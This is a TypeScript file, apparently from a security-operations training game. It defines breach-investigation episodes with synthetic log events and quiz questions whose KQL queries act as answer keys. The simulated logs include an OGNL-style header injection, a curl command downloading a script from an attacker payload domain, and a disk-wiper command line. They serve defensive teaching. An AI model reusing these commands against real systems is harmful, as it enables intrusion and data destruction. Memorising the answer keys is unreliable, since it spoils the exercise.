import { defineCasebook } from './casebook';
import { staffIn } from './world';
import { ASHEN_TIDE as AT, GLASS_HERON as GH } from './actors';

// ── Episode 27 · Four Quiet Years ───────────────────────────────────────────────────────────────
const EP27_DB = 'HF-CUSTOMER-DB-01';
const EP27_SVC = 'svc-reporting';

export const ep27 = defineCasebook({
  id: 'casebook-s1e27-four-quiet-years',
  episode: 27,
  title: 'Four Quiet Years',
  difficulty: 'Hard',
  replaces: 'siem-elastic-marriott-starwood-dwell-time',
  inspiredBy: 'a long-dwell intrusion in a customer database discovered only during a later acquisition review',
  date: '2027-03-01',
  briefing: 'During due diligence for an acquisition, auditors found a reporting service account querying the customer database far more than its job requires — and it has been doing so quietly for a long time. Long-dwell intrusions hide inside normal-looking activity. Establish what the account accessed, how much, and how the access was finally cut.',
  chapters: [
    { id: 'baseline', title: 'What is normal' },
    { id: 'anomaly', title: 'The quiet excess' },
    { id: 'response', title: 'Cutting access' },
  ],
  inject(t, when) {
    // A service account exporting large volumes of customer records, dressed as routine reporting.
    for (let i = 0; i < 40; i++) t.add('CloudAuditEvents', when(i % 2, `0${1 + (i % 6)}:${String((i * 7) % 60).padStart(2, '0')}:00`), { UserPrincipalName: EP27_SVC, Operation: 'DatabaseQuery', Resource: 'customers.guest_records', IPAddress: GH.ips.staging, SessionId: 'DWELL-27', Result: 'Success', ItemCount: 50_000 + i * 1000, DeviceName: EP27_DB });
    t.add('NetworkEvents', when(0, '02:00:00'), { DeviceName: EP27_DB, InitiatingProcessFileName: 'sqlexport.exe', RemoteIP: GH.ips.staging, RemotePort: 443, RemoteUrl: GH.domains.staging, ActionType: 'ConnectionSuccess', BytesSent: 500_000_000 });
    t.add('SecurityAlerts', when(1, '09:00:00'), { AlertName: 'Service account querying far above baseline', Severity: 'High', DeviceName: EP27_DB, Entity: EP27_SVC, Status: 'New', Product: 'Halcyon UEBA' });
    t.add('ThreatIntel', when(1, '08:00:00'), { Indicator: GH.ips.staging, IndicatorType: 'ip', Actor: GH.name, Confidence: 'Medium', Source: 'Acquisition security review', Limitation: 'Discovery date is not breach date; the true dwell period likely predates the earliest retained logs.' });
    t.add('ResponseActions', when(1, '10:00:00'), { IncidentId: 'IR-0301', Target: EP27_SVC, Action: 'DisableAccount', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(1, '10:05:00'), { IncidentId: 'IR-0301', Target: GH.ips.staging, Action: 'BlockIndicator', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(1, '11:00:00'), { IncidentId: 'IR-0301', Target: 'service-accounts', Action: 'EnableUebaBaselines', Result: 'Success', ApprovedBy: 'ciso' });
  },
  questions: [
    { chapter: 'baseline', prompt: 'Which service account was querying the customer database?', teach: 'Long-dwell intrusions hide behind legitimate-looking identities. A reporting service account is trusted and rarely reviewed — exactly why an attacker would ride it. Identify it first.', query: 'CloudAuditEvents | where Operation == "DatabaseQuery" | distinct UserPrincipalName', column: 'UserPrincipalName', hint: 'distinct UserPrincipalName on the DatabaseQuery events.' },
    { chapter: 'baseline', prompt: 'How many database queries did the account make across the window?', teach: 'Behavioural analytics compares an identity to its own history. Counting queries establishes the volume that triggered the anomaly — far above what reporting needs.', query: `CloudAuditEvents | where Operation == "DatabaseQuery" and UserPrincipalName == "${EP27_SVC}" | count`, column: 'Count', hint: 'Count DatabaseQuery events for the service account.', type: 'number' },
    { chapter: 'anomaly', prompt: 'How many customer records did it read in total?', teach: 'Summing the records read estimates the exposure — the number that matters for breach notification and the acquisition’s valuation.', query: `CloudAuditEvents | where Operation == "DatabaseQuery" and UserPrincipalName == "${EP27_SVC}" | summarize sum(ItemCount)`, column: 'sum_ItemCount', hint: 'summarize sum(ItemCount) over the queries.', type: 'number' },
    { chapter: 'anomaly', prompt: 'To which external IP did the database export data?', teach: 'Reading records is one thing; exfiltration is another. A large outbound transfer from the DB host to an external address confirms the data left the building.', query: 'NetworkEvents | where DeviceName == "HF-CUSTOMER-DB-01" and InitiatingProcessFileName == "sqlexport.exe"', column: 'RemoteIP', hint: 'Find the export process’s connection on the DB host.' },
    { chapter: 'anomaly', prompt: 'How many bytes were exported?', teach: 'The exfiltration volume, alongside the record count, quantifies the loss. Half a gigabyte of guest records is a material breach.', query: 'NetworkEvents | where DeviceName == "HF-CUSTOMER-DB-01" and InitiatingProcessFileName == "sqlexport.exe"', column: 'BytesSent', hint: 'Read BytesSent on the export connection.', type: 'number' },
    { chapter: 'anomaly', prompt: 'Which actor does intelligence link to the destination?', teach: 'Attribution ties the exfil address to a known espionage actor. The caveat is sobering: discovery date is not breach date — the real dwell likely predates your logs.', query: `ThreatIntel | where Indicator == "${GH.ips.staging}"`, column: 'Actor', hint: 'Look the destination IP up in ThreatIntel.' },
    { chapter: 'anomaly', prompt: 'What limitation does the intelligence note about dwell time?', teach: 'Long-dwell cases rarely reveal their true start. The intel record warns that the earliest retained logs may post-date the breach — report dwell as "at least", never "exactly".', query: `ThreatIntel | where Indicator == "${GH.ips.staging}"`, column: 'Limitation', hint: 'Read the Limitation on the intel record.' },
    { chapter: 'response', prompt: 'Which action cut the account’s access?', teach: 'Disabling the compromised service account stops the ongoing queries immediately while the full scope is assessed.', query: `ResponseActions | where Target == "${EP27_SVC}"`, column: 'Action', hint: 'Find the response action targeting the service account.' },
    { chapter: 'response', prompt: 'Which control would surface the next quiet excess sooner? Enter the response action name.', teach: 'The reason this went unnoticed for years is that nobody baselined the service account. Enabling behavioural baselines on service accounts is the detection fix.', query: 'ResponseActions | where Target == "service-accounts"', column: 'Action', hint: 'Find the response action targeting service accounts.' },
    { chapter: 'response', prompt: 'Which incident ID tracks the response?', teach: 'One incident ID groups the account disable, indicator block and detection change into a single reviewable response.', query: 'ResponseActions | where Action == "EnableUebaBaselines"', column: 'IncidentId', hint: 'Read IncidentId on the UEBA-baseline action.' },
  ],
});

// ── Episode 28 · The Unpatched Portal ───────────────────────────────────────────────────────────
const EP28_SERVER = 'HF-WEB-CLAIMS-01';
const EP28_ATTACKER = '203.0.113.212';

export const ep28 = defineCasebook({
  id: 'casebook-s1e28-unpatched-portal',
  episode: 28,
  title: 'The Unpatched Portal',
  difficulty: 'Hard',
  replaces: 'siem-splunk-equifax-struts-expired-cert',
  inspiredBy: 'remote code execution through an unpatched web framework, missed because traffic inspection had lapsed',
  date: '2027-03-08',
  briefing: 'Halcyon’s claims portal runs a web framework with a critical flaw that was never patched. Worse, the appliance that inspects encrypted traffic had an expired certificate, so for weeks it saw nothing. An attacker walked in through the open door. Trace the exploitation, what they took, and fix both the flaw and the blind spot.',
  chapters: [
    { id: 'blindspot', title: 'The blind spot' },
    { id: 'exploit', title: 'The exploit' },
    { id: 'theft', title: 'What they took' },
    { id: 'response', title: 'Patch and see again' },
  ],
  inject(t, when) {
    t.add('SecurityAlerts', when(-0, '00:00:00'), { AlertName: 'Traffic inspection certificate expired', Severity: 'Medium', DeviceName: 'HF-TLS-INSPECT-01', Entity: 'tls-inspection', Status: 'Dismissed', Product: 'Halcyon Network Defender' });
    t.add('WebServerLogs', when(0, '11:00:00'), { Site: 'claims.halcyonfreight.example', ClientIP: EP28_ATTACKER, Method: 'POST', Url: '/claims/upload.action', StatusCode: 200, UserAgent: 'Content-Type: %{(#cmd=\'whoami\')}', BytesSent: 3_200 });
    t.add('ProcessEvents', when(0, '11:00:30'), { DeviceName: EP28_SERVER, AccountName: 'claims-svc', ProcessName: 'bash', ParentProcessName: 'java.exe', CommandLine: 'bash -c whoami', SHA256: 'rce-shell' });
    t.add('ProcessEvents', when(0, '11:05:00'), { DeviceName: EP28_SERVER, AccountName: 'claims-svc', ProcessName: 'curl.exe', ParentProcessName: 'java.exe', CommandLine: `curl.exe -s https://${AT.domains.payload}/dump.sh -o /tmp/dump.sh`, SHA256: 'curl-signed' });
    t.add('CloudAuditEvents', when(0, '11:20:00'), { UserPrincipalName: 'claims-svc', Operation: 'DatabaseQuery', Resource: 'claims.customer_pii', IPAddress: EP28_ATTACKER, SessionId: 'RCE-28', Result: 'Success', ItemCount: 1_200_000 });
    t.add('NetworkEvents', when(0, '11:30:00'), { DeviceName: EP28_SERVER, InitiatingProcessFileName: 'java.exe', RemoteIP: AT.ips.exfil, RemotePort: 443, RemoteUrl: AT.domains.exfil, ActionType: 'ConnectionSuccess', BytesSent: 300_000_000 });
    t.add('SecurityAlerts', when(0, '12:00:00'), { AlertName: 'Web server spawned shell and exfiltrated data', Severity: 'High', DeviceName: EP28_SERVER, Entity: 'claims-svc', Status: 'New', Product: 'Halcyon EDR' });
    t.add('ResponseActions', when(0, '13:00:00'), { IncidentId: 'IR-0308', Target: EP28_SERVER, Action: 'ApplyPatch', Result: 'Success', PatchVersion: 'webframework-2.5.33', ApprovedBy: 'app-owner' });
    t.add('ResponseActions', when(0, '13:10:00'), { IncidentId: 'IR-0308', Target: 'tls-inspection', Action: 'RenewCertificate', Result: 'Success', ApprovedBy: 'network-eng' });
    t.add('ResponseActions', when(0, '13:20:00'), { IncidentId: 'IR-0308', Target: AT.ips.exfil, Action: 'BlockIndicator', Result: 'Success', ApprovedBy: 'soc-lead' });
  },
  questions: [
    { chapter: 'blindspot', prompt: 'Which dismissed medium-severity alert explains the blind spot?', teach: 'Breaches often hide behind an ignored low-priority alert. An expired traffic-inspection certificate means encrypted attacks pass unseen — and this one was dismissed, not fixed.', query: 'SecurityAlerts | where Entity == "tls-inspection"', column: 'AlertName', hint: 'Find the alert about the inspection certificate.' },
    { chapter: 'exploit', prompt: 'Which IP sent the exploit request to the claims portal?', teach: 'The exploit hides a command inside a malformed Content-Type header on an upload endpoint. Identify the attacker IP from the web log to block it and trace its other activity.', query: 'WebServerLogs | where Url contains "upload.action" and Method == "POST" | distinct ClientIP', column: 'ClientIP', hint: 'distinct ClientIP on the POST to the upload endpoint.' },
    { chapter: 'exploit', prompt: 'Which process spawned a shell under the Java web app?', teach: 'Successful RCE shows up as the web process (java.exe) launching a shell. A claims portal’s Java process spawning bash is proof the framework flaw was exploited.', query: `ProcessEvents | where DeviceName == "${EP28_SERVER}" and ParentProcessName == "java.exe" and ProcessName == "bash"`, column: 'ProcessName', hint: 'Find the bash child of java.exe.' },
    { chapter: 'exploit', prompt: 'Under which service account did the code run?', teach: 'Code runs with the web app’s privileges. The service account determines what data and systems the attacker could reach, and which credentials to rotate.', query: `ProcessEvents | where DeviceName == "${EP28_SERVER}" and ParentProcessName == "java.exe" and ProcessName == "bash"`, column: 'AccountName', hint: 'Read AccountName on the shell process.' },
    { chapter: 'theft', prompt: 'How many customer PII records were queried?', teach: 'With code execution, the attacker queried the claims database directly. The record count scopes the exposure — over a million PII records is a major breach.', query: 'CloudAuditEvents | where SessionId == "RCE-28" and Operation == "DatabaseQuery"', column: 'ItemCount', hint: 'Read ItemCount on the database query in the RCE session.', type: 'number' },
    { chapter: 'theft', prompt: 'To which external IP was data exfiltrated?', teach: 'Find where it went. A large outbound transfer from the web server to an external address is the exfiltration — and the address matches the actor’s known infrastructure.', query: `NetworkEvents | where DeviceName == "${EP28_SERVER}" and InitiatingProcessFileName == "java.exe"`, column: 'RemoteIP', hint: 'Find the java.exe outbound connection.' },
    { chapter: 'theft', prompt: 'How many bytes were exfiltrated?', teach: 'Summing the outbound bytes quantifies the loss for the breach report, separate from the record count the database logged.', query: `NetworkEvents | where DeviceName == "${EP28_SERVER}" and InitiatingProcessFileName == "java.exe"`, column: 'BytesSent', hint: 'Read BytesSent on the exfil connection.', type: 'number' },
    { chapter: 'response', prompt: 'Which framework version was patched?', teach: 'The root cause is the unpatched framework. Applying the fixed version closes the RCE. Record it so every portal can be verified.', query: 'ResponseActions | where Action == "ApplyPatch" and IncidentId == "IR-0308"', column: 'PatchVersion', hint: 'Read PatchVersion on the patch action.' },
    { chapter: 'response', prompt: 'Which action restored traffic visibility? Enter the response action name.', teach: 'The second fix addresses the blind spot: renewing the inspection certificate restores the visibility that would have caught this attack in the act.', query: 'ResponseActions | where Target == "tls-inspection"', column: 'Action', hint: 'Find the response action targeting TLS inspection.' },
    { chapter: 'response', prompt: 'Which incident ID ties patch, certificate and block together?', teach: 'One incident ID groups the two root-cause fixes and the indicator block — a response that addresses both the flaw and the reason it was missed.', query: 'ResponseActions | where Action == "RenewCertificate"', column: 'IncidentId', hint: 'Read IncidentId on the certificate-renewal action.' },
  ],
});

// ── Episode 29 · Take Then Burn ─────────────────────────────────────────────────────────────────
const ep29Victim = staffIn('IT')[6];
const EP29_FILESERVER = 'HF-FILESERVER-01';

export const ep29 = defineCasebook({
  id: 'casebook-s1e29-take-then-burn',
  episode: 29,
  title: 'Take Then Burn',
  difficulty: 'Hard',
  replaces: 'siem-splunk-sony-pictures-2014-exfil-then-wiper',
  inspiredBy: 'overnight mass data theft followed by a wiper to destroy evidence and systems',
  date: '2027-03-15',
  briefing: 'Overnight, hundreds of gigabytes left the corporate file server — and then the server was wiped. This is a two-stage attack: steal everything first, destroy the evidence second. The wipe is loud, but the theft is the real damage. Reconstruct what was taken before the burn, and how the response recovered.',
  chapters: [
    { id: 'theft', title: 'The quiet theft' },
    { id: 'burn', title: 'The wipe' },
    { id: 'response', title: 'Recovery' },
  ],
  inject(t, when) {
    t.add('ProcessEvents', when(0, '01:10:00'), { DeviceName: EP29_FILESERVER, AccountName: ep29Victim.username, ProcessName: '7z.exe', ParentProcessName: 'cmd.exe', CommandLine: '7z.exe a -tzip C:\\Temp\\all.zip D:\\Shares', SHA256: 'archiver' });
    t.add('NetworkEvents', when(0, '01:40:00'), { DeviceName: EP29_FILESERVER, InitiatingProcessFileName: '7z.exe', RemoteIP: AT.ips.exfil, RemotePort: 443, RemoteUrl: AT.domains.exfil, ActionType: 'ConnectionSuccess', BytesSent: 380_000_000_000 / 1000 });
    for (let i = 0; i < 12; i++) t.add('NetworkEvents', when(0, `0${1 + Math.floor(i / 6)}:${String(45 + i).padStart(2, '0')}:00`), { DeviceName: EP29_FILESERVER, InitiatingProcessFileName: 'rclone.exe', RemoteIP: AT.ips.exfil, RemotePort: 443, RemoteUrl: AT.domains.exfil, ActionType: 'ConnectionSuccess', BytesSent: 30_000_000_000 });
    t.add('ProcessEvents', when(0, '03:30:00'), { DeviceName: EP29_FILESERVER, AccountName: 'SYSTEM', ProcessName: 'wiper.exe', ParentProcessName: 'cmd.exe', CommandLine: 'wiper.exe /all /force', SHA256: 'disk-wiper' });
    for (let i = 0; i < 30; i++) t.add('FileEvents', when(0, `03:${String(31 + i).padStart(2, '0')}:00`), { DeviceName: EP29_FILESERVER, AccountName: 'SYSTEM', ActionType: 'FileDeleted', FileName: `share-${i}.dat`, FolderPath: 'D:\\Shares', SizeBytes: 0, SHA256: 'wiped' });
    t.add('SecurityAlerts', when(0, '04:00:00'), { AlertName: 'Mass file deletion after large outbound transfer', Severity: 'High', DeviceName: EP29_FILESERVER, Entity: 'file-server', Status: 'New', Product: 'Halcyon EDR' });
    t.add('ThreatIntel', when(0, '05:00:00'), { Indicator: AT.ips.exfil, IndicatorType: 'ip', Actor: AT.name, Confidence: 'High', Source: 'Industry sharing group', Limitation: 'The wipe destroys local evidence; reconstruction depends on network logs and off-host backups.' });
    t.add('ResponseActions', when(0, '05:30:00'), { IncidentId: 'IR-0315', Target: EP29_FILESERVER, Action: 'IsolateDevice', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '09:00:00'), { IncidentId: 'IR-0315', Target: EP29_FILESERVER, Action: 'RestoreFromBackup', Result: 'Success', BackupAge: '20h', ApprovedBy: 'it-manager' });
    t.add('ResponseActions', when(0, '09:30:00'), { IncidentId: 'IR-0315', Target: AT.ips.exfil, Action: 'BlockIndicator', Result: 'Success', ApprovedBy: 'soc-lead' });
  },
  questions: [
    { chapter: 'theft', prompt: 'Which tool archived the file shares before exfiltration?', teach: 'Attackers stage data before stealing it — compressing shares into one archive. A command-line archiver bundling D:\\Shares at 1am is the collection step, before the louder wipe.', query: `ProcessEvents | where DeviceName == "${EP29_FILESERVER}" and CommandLine contains "D:\\\\Shares"`, column: 'ProcessName', hint: 'Find the process whose command line archives the shares.' },
    { chapter: 'theft', prompt: 'Which tool carried the bulk upload out?', teach: 'A dedicated sync tool (rclone) making repeated large outbound transfers is a classic exfiltration pattern. Distinguishing the uploader from the archiver clarifies the two phases.', query: `NetworkEvents | where DeviceName == "${EP29_FILESERVER}" and InitiatingProcessFileName == "rclone.exe" | distinct InitiatingProcessFileName`, column: 'InitiatingProcessFileName', hint: 'distinct InitiatingProcessFileName on the repeated uploads.' },
    { chapter: 'theft', prompt: 'How many bytes did the sync tool upload in total?', teach: 'Summing the sync tool’s outbound bytes estimates the stolen volume — the real damage, which the subsequent wipe is designed to distract from.', query: `NetworkEvents | where DeviceName == "${EP29_FILESERVER}" and InitiatingProcessFileName == "rclone.exe" | summarize sum(BytesSent)`, column: 'sum_BytesSent', hint: 'summarize sum(BytesSent) over the rclone connections.', type: 'number' },
    { chapter: 'theft', prompt: 'To which external IP did the data go?', teach: 'All the uploads share one destination — the actor’s exfil infrastructure. It is the indicator to block and the link to the wider campaign.', query: `NetworkEvents | where DeviceName == "${EP29_FILESERVER}" and InitiatingProcessFileName == "rclone.exe" | distinct RemoteIP`, column: 'RemoteIP', hint: 'distinct RemoteIP on the uploads.' },
    { chapter: 'burn', prompt: 'Which process performed the wipe?', teach: 'After theft comes destruction. A process named for its purpose, running as SYSTEM with a /all /force command line, is the wiper — loud by design, to cover the quiet theft.', query: `ProcessEvents | where DeviceName == "${EP29_FILESERVER}" and CommandLine contains "/all /force"`, column: 'ProcessName', hint: 'Find the process whose command line forces a full wipe.' },
    { chapter: 'burn', prompt: 'How many files were deleted by the wipe?', teach: 'Counting the FileDeleted events scopes the destruction. On a file server, this is also how much was lost locally — recoverable only from off-host backups.', query: `FileEvents | where DeviceName == "${EP29_FILESERVER}" and ActionType == "FileDeleted" | count`, column: 'Count', hint: 'Count FileDeleted events on the file server.', type: 'number' },
    { chapter: 'burn', prompt: 'What limitation does the intelligence note about the wipe?', teach: 'The wipe destroys local evidence, so reconstruction leans on network logs and backups. The intel record states this plainly — your timeline comes from what the wipe could not reach.', query: `ThreatIntel | where Indicator == "${AT.ips.exfil}"`, column: 'Limitation', hint: 'Read the Limitation on the exfil-IP intel record.' },
    { chapter: 'response', prompt: 'How old was the backup used to restore the server?', teach: 'Because the server was wiped, recovery came from an off-host backup. Its age is the data-loss window and the case for frequent, isolated backups.', query: 'ResponseActions | where Action == "RestoreFromBackup" and IncidentId == "IR-0315"', column: 'BackupAge', hint: 'Read BackupAge on the restore action.' },
    { chapter: 'response', prompt: 'Which address was blocked?', teach: 'Blocking the exfil destination protects other systems from the same channel and supports takedown efforts against the actor’s infrastructure.', query: 'ResponseActions | where Action == "BlockIndicator" and IncidentId == "IR-0315"', column: 'Target', hint: 'Find the BlockIndicator action and read its target.' },
    { chapter: 'response', prompt: 'Which incident ID tracks the response?', teach: 'One incident ID groups isolation, restore and block so the two-stage attack is reviewed as a single story.', query: 'ResponseActions | where Action == "RestoreFromBackup" and Target == "HF-FILESERVER-01"', column: 'IncidentId', hint: 'Read IncidentId on the restore action.' },
  ],
});

// ── Episode 30 · One Door Left Open ─────────────────────────────────────────────────────────────
const EP30_SERVER = 'HF-DEV-JUMP-01';
const EP30_ATTACKER = '198.51.100.90';

export const ep30 = defineCasebook({
  id: 'casebook-s1e30-one-door-left-open',
  episode: 30,
  title: 'One Door Left Open',
  difficulty: 'Medium',
  replaces: 'siem-qradar-jpmorgan-2014-missed-server',
  inspiredBy: 'a single server missed in an MFA rollout, used as the entry point to a wider network',
  date: '2027-03-22',
  briefing: 'A company-wide MFA rollout last quarter was declared complete. But one development jump server was missed. An attacker with a reused password found it, logged in with just a password, and used it as a foothold. Find the one server without MFA, what the attacker reached from it, and confirm the gap is closed.',
  chapters: [
    { id: 'entry', title: 'The missed server' },
    { id: 'pivot', title: 'The foothold' },
    { id: 'response', title: 'Close the gap' },
  ],
  inject(t, when) {
    t.add('SigninLogs', when(0, '22:10:00'), { UserPrincipalName: 'devops@halcyonfreight.example', IPAddress: EP30_ATTACKER, ResultType: 0, ResultDescription: 'Success', AppName: 'Dev Jump Server', DeviceName: EP30_SERVER, Location: 'US', MfaResult: 'NotRequired', SessionId: 'JUMP-30' });
    t.add('ProcessEvents', when(0, '22:20:00'), { DeviceName: EP30_SERVER, AccountName: 'devops', ProcessName: 'ssh.exe', ParentProcessName: 'cmd.exe', CommandLine: 'ssh.exe devops@HF-DB-REPLICA-01', SHA256: 'ssh-signed' });
    t.add('NetworkEvents', when(0, '22:25:00'), { DeviceName: EP30_SERVER, InitiatingProcessFileName: 'ssh.exe', RemoteIP: '10.40.200.60', RemotePort: 22, RemoteUrl: '', ActionType: 'ConnectionSuccess', BytesSent: 4096 });
    t.add('CloudAuditEvents', when(0, '22:40:00'), { UserPrincipalName: 'devops', Operation: 'DatabaseQuery', Resource: 'replica.customer_records', IPAddress: EP30_ATTACKER, SessionId: 'JUMP-30', Result: 'Success', ItemCount: 300_000, DeviceName: 'HF-DB-REPLICA-01' });
    t.add('SecurityAlerts', when(0, '23:30:00'), { AlertName: 'Password-only sign-in to internet-facing server', Severity: 'High', DeviceName: EP30_SERVER, Entity: 'devops@halcyonfreight.example', Status: 'New', Product: 'Halcyon Identity Protection' });
    t.add('ResponseActions', when(0, '23:50:00'), { IncidentId: 'IR-0322', Target: 'devops@halcyonfreight.example', Action: 'ForcePasswordReset', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '23:55:00'), { IncidentId: 'IR-0322', Target: EP30_SERVER, Action: 'EnrollMfa', Result: 'Success', ApprovedBy: 'security-eng' });
    t.add('ResponseActions', when(1, '09:00:00'), { IncidentId: 'IR-0322', Target: 'all-servers', Action: 'AuditMfaCoverage', Result: 'Success', GapsFound: 0, ApprovedBy: 'ciso' });
  },
  questions: [
    { chapter: 'entry', prompt: 'Which server accepted a password-only sign-in?', teach: 'One missed server undoes a whole MFA programme. A successful sign-in with MfaResult "NotRequired" to an internet-facing host is the gap the attacker found.', query: 'SigninLogs | where MfaResult == "NotRequired" and AppName == "Dev Jump Server"', column: 'DeviceName', hint: 'Find the sign-in where MFA was NotRequired on the jump server.' },
    { chapter: 'entry', prompt: 'From which IP did the attacker sign in?', teach: 'The source address is the attacker and your block target. A reused password plus no MFA is all it took to get in.', query: `SigninLogs | where DeviceName == "${EP30_SERVER}" and MfaResult == "NotRequired"`, column: 'IPAddress', hint: 'Read IPAddress on the password-only sign-in.' },
    { chapter: 'entry', prompt: 'Which account was used?', teach: 'A shared devops account on a jump server is a high-value target — broad access, often excluded from MFA "for automation". Identify it for the reset.', query: `SigninLogs | where DeviceName == "${EP30_SERVER}" and MfaResult == "NotRequired"`, column: 'UserPrincipalName', hint: 'Read UserPrincipalName on the sign-in.' },
    { chapter: 'pivot', prompt: 'Which host did the attacker SSH to from the jump server?', teach: 'A jump server exists to reach other systems — exactly why attackers prize it. The SSH command line names the next hop, a database replica.', query: `ProcessEvents | where DeviceName == "${EP30_SERVER}" and ProcessName == "ssh.exe"`, column: 'CommandLine', hint: 'Read the ssh.exe command line on the jump server.' },
    { chapter: 'pivot', prompt: 'Which port did that pivot use?', teach: 'Port 22 is SSH. Confirming the pivot connection ties the jump-server login to activity on the replica — the chain from entry to data.', query: `NetworkEvents | where DeviceName == "${EP30_SERVER}" and InitiatingProcessFileName == "ssh.exe"`, column: 'RemotePort', hint: 'Read RemotePort on the ssh connection.', type: 'number' },
    { chapter: 'pivot', prompt: 'How many customer records were queried on the replica?', teach: 'From the replica the attacker read customer data. The record count scopes the exposure that the one missed server ultimately enabled.', query: 'CloudAuditEvents | where SessionId == "JUMP-30" and Operation == "DatabaseQuery"', column: 'ItemCount', hint: 'Read ItemCount on the replica database query.', type: 'number' },
    { chapter: 'response', prompt: 'Which control was added to the missed server? Enter the response action name.', teach: 'The immediate fix is enrolling the server in MFA so a password alone is no longer enough — closing the specific door the attacker used.', query: `ResponseActions | where Target == "${EP30_SERVER}"`, column: 'Action', hint: 'Find the response action targeting the jump server.' },
    { chapter: 'response', prompt: 'Which action checks that no other server was missed? Enter the response action name.', teach: 'One gap implies there may be others. Auditing MFA coverage across all servers verifies the rollout is truly complete — the systemic fix beyond this one host.', query: 'ResponseActions | where Target == "all-servers"', column: 'Action', hint: 'Find the response action targeting all servers.' },
    { chapter: 'response', prompt: 'How many MFA gaps did the audit find?', teach: 'The audit result (zero further gaps) is the evidence that closes the incident — the assurance leadership needs that the programme is now complete.', query: 'ResponseActions | where Action == "AuditMfaCoverage"', column: 'GapsFound', hint: 'Read GapsFound on the audit action.', type: 'number' },
    { chapter: 'response', prompt: 'Which incident ID tracks the response?', teach: 'One incident ID groups the reset, the server enrolment and the coverage audit into a single reviewable response.', query: 'ResponseActions | where Action == "AuditMfaCoverage"', column: 'IncidentId', hint: 'Read IncidentId on the audit action.' },
  ],
});

// ── Episode 31 · Reading the Wreckage ───────────────────────────────────────────────────────────
export const ep31 = defineCasebook({
  id: 'casebook-s1e31-reading-the-wreckage',
  episode: 31,
  title: 'Reading the Wreckage',
  difficulty: 'Medium',
  replaces: 'siem-splunk-log-normalization-essentials',
  inspiredBy: 'piecing together a global outage from logs in many different formats and field names',
  date: '2027-03-29',
  briefing: 'A fast-moving incident hit systems across the company, and the evidence is scattered across sources that each name things differently — one calls it Account, another UserPrincipalName, another user. Before you can tell the story you have to normalise: recognise that different field names describe the same thing. Practise reading across sources to reconstruct one timeline.',
  chapters: [
    { id: 'sources', title: 'Know your sources' },
    { id: 'normalise', title: 'Same thing, different names' },
    { id: 'timeline', title: 'One story' },
  ],
  inject(t, when) {
    const e = staffIn('IT')[2];
    t.add('EmailEvents', when(0, '07:50:00'), { MessageId: 'AT-NRM-31', SenderAddress: `update@${AT.domains.payload}`, RecipientAddress: e.email, Subject: 'Critical security update required', AttachmentName: 'update.exe', Url: '', DeliveryAction: 'Delivered', Verdict: 'Clean' });
    t.add('ProcessEvents', when(0, '08:05:00'), { DeviceName: e.hostname, AccountName: e.username, ProcessName: 'update.exe', ParentProcessName: 'explorer.exe', CommandLine: 'update.exe', SHA256: 'loader-31' });
    t.add('SigninLogs', when(0, '08:20:00'), { UserPrincipalName: e.email, IPAddress: AT.ips.c2, ResultType: 0, ResultDescription: 'Success', AppName: 'Halcyon Portal', DeviceName: e.hostname, Location: 'US', MfaResult: 'NotRequired', SessionId: 'NRM-31' });
    t.add('NetworkEvents', when(0, '08:30:00'), { DeviceName: e.hostname, InitiatingProcessFileName: 'update.exe', RemoteIP: AT.ips.c2, RemotePort: 443, RemoteUrl: AT.domains.payload, ActionType: 'ConnectionSuccess', BytesSent: 1200 });
    t.add('SecurityAlerts', when(0, '09:00:00'), { AlertName: 'Fake update executed on IT host', Severity: 'High', DeviceName: e.hostname, Entity: e.email, Status: 'New', Product: 'Halcyon EDR' });
    t.add('ThreatIntel', when(0, '08:45:00'), { Indicator: AT.ips.c2, IndicatorType: 'ip', Actor: AT.name, Confidence: 'High', Source: 'Industry sharing group', Limitation: 'Correlation across sources depends on consistent timestamps; clock drift between systems can misorder events.' });
    t.add('ResponseActions', when(0, '09:30:00'), { IncidentId: 'IR-0329', Target: e.hostname, Action: 'IsolateDevice', Result: 'Success', ApprovedBy: 'soc-lead' });
  },
  questions: [
    { chapter: 'sources', prompt: 'How many records are in the EmailEvents table for this case? Count them.', teach: 'Different log sources answer different questions. Before correlating, know what each holds. EmailEvents records mail delivery; counting it is the first orientation step.', query: 'EmailEvents | count', column: 'Count', hint: 'Count the EmailEvents table.', type: 'number' },
    { chapter: 'sources', prompt: 'Which attachment delivered the fake update?', teach: 'The incident begins in email. A supposed "security update" as an .exe attachment is the lure — the first event in the timeline you are about to build.', query: 'EmailEvents | where MessageId == "AT-NRM-31"', column: 'AttachmentName', hint: 'Read AttachmentName on the lure email.' },
    { chapter: 'normalise', prompt: 'Which process ran the fake update on the host?', teach: 'Endpoint logs name the field "ProcessName". Recognising that this is the "what executed" field — regardless of what another source might call it — is the core normalisation skill.', query: 'ProcessEvents | where CommandLine == "update.exe"', column: 'ProcessName', hint: 'Find the process whose command line is the fake update.' },
    { chapter: 'normalise', prompt: 'Which account signed in after the update ran? (The sign-in log calls it UserPrincipalName.)', teach: 'The sign-in log calls the actor "UserPrincipalName"; the endpoint log called the same person "AccountName". Normalising means knowing these are the same entity so you can pivot between sources.', query: 'SigninLogs | where SessionId == "NRM-31"', column: 'UserPrincipalName', hint: 'Find the sign-in with the incident session ID.' },
    { chapter: 'normalise', prompt: 'Which IP appears as both the sign-in source and the network destination?', teach: 'The attacker’s C2 address shows up as "IPAddress" in sign-in logs and "RemoteIP" in network logs. Recognising one value across differently named fields is how you connect the sources.', query: 'SigninLogs | where SessionId == "NRM-31"', column: 'IPAddress', hint: 'Read IPAddress on the suspicious sign-in; it matches the network RemoteIP.' },
    { chapter: 'normalise', prompt: 'Confirm it from the network side: which RemoteIP did the update process contact?', teach: 'Verify the match from the other source. The update process’s RemoteIP equalling the sign-in IPAddress proves they describe one address — a normalised entity you can now pivot on confidently.', query: 'NetworkEvents | where InitiatingProcessFileName == "update.exe"', column: 'RemoteIP', hint: 'Read RemoteIP on the update process’s connection.' },
    { chapter: 'timeline', prompt: 'Which actor does intelligence link to that address?', teach: 'With sources normalised, intelligence ties it together. The caveat is a normalisation lesson too: correlation assumes consistent timestamps, and clock drift can misorder events.', query: `ThreatIntel | where Indicator == "${AT.ips.c2}"`, column: 'Actor', hint: 'Look the C2 IP up in ThreatIntel.' },
